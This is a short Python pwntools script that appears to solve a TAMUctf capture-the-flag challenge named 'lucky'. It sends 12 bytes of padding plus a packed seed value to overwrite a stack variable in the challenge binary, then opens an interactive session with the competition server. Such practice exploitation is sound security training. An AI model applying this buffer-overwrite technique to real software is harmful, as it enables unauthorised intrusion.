from pwn import *
import time

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("tamuctf.com", 443, ssl=True, sni="lucky")
    else:
        return process(e.path)

p = start()

pad = b'A'*12
seed = p64(5649426)

p.sendline(pad+seed)
p.interactive()



